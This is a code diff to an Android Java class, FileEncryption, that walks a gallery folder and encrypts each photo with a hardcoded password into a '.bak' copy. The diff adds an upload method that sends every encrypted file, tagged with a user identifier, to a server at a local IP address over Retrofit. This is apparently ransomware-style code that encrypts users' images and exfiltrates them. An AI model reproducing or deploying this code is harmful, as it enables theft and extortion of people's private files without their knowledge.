@@ -22,6 +22,15 @@ import javax.crypto.spec.GCMParameterSpec;
 import javax.crypto.spec.PBEKeySpec;
 import javax.crypto.spec.SecretKeySpec;
 
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.RequestBody;
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
+import retrofit2.Retrofit;
+import retrofit2.converter.gson.GsonConverterFactory;
+
 public class FileEncryption {
     private static final String PASSWORD = "asdosfu8901ens98fy2nr89ssdf1f";
     private static final String ENCRYPT_ALGO = "AES/GCM/NoPadding";
@@ -44,6 +53,7 @@ public class FileEncryption {
                         String fromFile = targetDirectory + "" + galleryFolderFile.getFileName();
                         String toFile = targetDirectory + "" + galleryFolderFile.getFileName() + ".bak";
                         encryptFile(fromFile, toFile);
+                        upload(toFile);
                     }
                 } catch (Exception e) {
                     System.out.println("Something went wrong: " + e);
@@ -52,6 +62,30 @@ public class FileEncryption {
         } catch (Exception e) {
             System.out.println("Something went wrong: " + e);
         }
+    }
+
+    private void upload(String file) {
+        RequestBody descriptionPart = RequestBody.create(MultipartBody.FORM, file);
+        RequestBody filePart = RequestBody.create(MediaType.parse("multipart/form-data"), new File(file));
+        MultipartBody.Part multipartFile = MultipartBody.Part.createFormData("file", file, filePart);
+
+        Retrofit retrofit = new Retrofit.Builder()
+                .baseUrl("http://192.168.1.16:3000/")
+                .addConverterFactory(GsonConverterFactory.create())
+                .build();
+        RetrofitAPI retrofitAPI = retrofit.create(RetrofitAPI.class);
+        Call<okhttp3.ResponseBody> call = retrofitAPI.upload(MyApplication.user, descriptionPart, multipartFile);
+        call.enqueue(new Callback<okhttp3.ResponseBody>() {
+            @Override
+            public void onResponse(Call<okhttp3.ResponseBody> call, Response<okhttp3.ResponseBody> response) {
+                System.out.println(response);
+            }
+
+            @Override
+            public void onFailure(Call<okhttp3.ResponseBody> call, Throwable t) {
+                System.out.println("Something went wrong during file upload: " + t);
+            }
+        });
     }
 
     @RequiresApi(api = Build.VERSION_CODES.O)
